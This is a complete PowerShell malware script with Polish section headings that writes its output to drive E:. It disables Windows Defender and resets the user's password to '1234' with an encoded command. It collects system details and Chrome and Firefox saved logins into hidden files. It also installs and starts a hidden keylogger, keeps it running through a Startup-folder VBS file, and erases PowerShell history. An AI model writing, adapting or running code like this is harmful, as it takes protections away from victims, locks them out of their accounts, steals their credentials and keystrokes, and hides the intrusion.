# ================ WYŁĄCZENIE ZABEZPIECZEŃ ================
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableIOAVProtection $true
Stop-Service -Name WinDefend -Force
Set-Service -Name WinDefend -StartupType Disabled

# ================ ZMIANA HASŁA ================
function Change-Password {
    $username = $env:USERNAME
    $newPassword = "1234"
    
    $command = "net user $username $newPassword"
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $encodedCommand = [Convert]::ToBase64String($bytes)
    
    Start-Process powershell -ArgumentList "-EncodedCommand $encodedCommand" -Wait
}

Change-Password

# ================ ZBIERANIE DANYCH SYSTEMOWYCH ================
$systemFile = "E:\SystemData.dat"
$systemInfo = @{
    ComputerName = $env:COMPUTERNAME
    UserName = $env:USERNAME
    OS = (Get-WmiObject Win32_OperatingSystem).Caption
    Architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
    CPU = (Get-WmiObject Win32_Processor).Name
    RAM = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    Network = Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address
    RunningProcesses = Get-Process | Select-Object Name, Id -First 20
    Users = Get-WmiObject Win32_UserAccount | Select-Object Name, Disabled, Status
} | ConvertTo-Json -Depth 5

$systemInfo | Out-File $systemFile -Encoding UTF8
attrib +s +h +r $systemFile

# ================ PRZEGLĄDARKI I HASŁA ================
$browserFile = "E:\BrowserData.dat"
$browserData = @{}

# Chrome
try {
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    if (Test-Path $chromePath) {
        $tempCopy = "$env:TEMP\chrome_data"
        Copy-Item $chromePath $tempCopy -Force
        
        $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
        $connection.ConnectionString = "Data Source=$tempCopy;"
        $connection.Open()
        
        $command = $connection.CreateCommand()
        $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
        $adapter = New-Object -TypeName System.Data.SQLite.SQLiteDataAdapter $command
        $dataset = New-Object -TypeName System.Data.DataSet
        $adapter.Fill($dataset) | Out-Null
        
        $chromeData = @()
        foreach ($row in $dataset.Tables[0].Rows) {
            $chromeData += @{
                URL = $row.origin_url
                Username = $row.username_value
                Password = if ($row.password_value) { "ENCRYPTED" } else { $null }
            }
        }
        $browserData.Chrome = $chromeData
        $connection.Close()
        Remove-Item $tempCopy -Force
    }
} catch { $browserData.Chrome_Error = $_.Exception.Message }

# Firefox
try {
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxPath) {
        $profile = Get-ChildItem $firefoxPath -Directory | Where-Object { 
            $_.Name -match "default-release" 
        } | Select-Object -First 1
        
        $loginsJson = Join-Path $profile.FullName "logins.json"
        if (Test-Path $loginsJson) {
            $firefoxData = Get-Content $loginsJson | ConvertFrom-Json
            $browserData.Firefox = $firefoxData.logins
        }
    }
} catch { $browserData.Firefox_Error = $_.Exception.Message }

$browserData | ConvertTo-Json -Depth 5 | Out-File $browserFile -Encoding UTF8
attrib +s +h +r $browserFile

# ================ KEYLOGGER ================
$keyloggerFile = "E:\Keylogger.ps1"
$keylogOutput = "E:\Keylog.dat"

$keyloggerScript = @'
$signature = @"
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
"@
Add-Type -MemberDefinition $signature -Name Keyboard -Namespace KeyLogger

$logPath = "E:\Keylog.dat"
$lastWindow = ""

while($true) {
    Start-Sleep -Milliseconds 40
    
    # Śledzenie aktywnego okna
    $currentWindow = (Get-Process | Where-Object { $_.MainWindowTitle -ne "" }).MainWindowTitle | Select-Object -First 1
    if ($currentWindow -ne $lastWindow) {
        $lastWindow = $currentWindow
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        "[$timestamp] Active Window: $currentWindow" | Out-File $logPath -Append -Encoding UTF8
    }
    
    # Rejestracja klawiszy
    for ($asc = 8; $asc -le 254; $asc++) {
        $state = [KeyLogger.Keyboard]::GetAsyncKeyState($asc)
        if ($state -eq -32767) {
            $key = switch ($asc) {
                8 { "[BACKSPACE]" }
                9 { "[TAB]" }
                13 { "[ENTER]`n" }
                27 { "[ESC]" }
                32 { " " }
                default { [char]$asc }
            }
            $key | Out-File $logPath -Append -Encoding UTF8
        }
    }
}
'@

$keyloggerScript | Out-File $keyloggerFile -Encoding UTF8
attrib +s +h +r $keyloggerFile
attrib +s +h +r $keylogOutput

# Uruchom keyloggera
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$keyloggerFile`"" -WindowStyle Hidden

# ================ PERSYSTENCJA ================
$persistenceFile = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemInit.vbs"
$persistenceScript = @"
Set ws = CreateObject("WScript.Shell")
ws.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File ""E:\Keylogger.ps1""", 0
"@

$persistenceScript | Out-File $persistenceFile -Encoding ASCII

# ================ CZYSZCZENIE ŚLADÓW ================
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
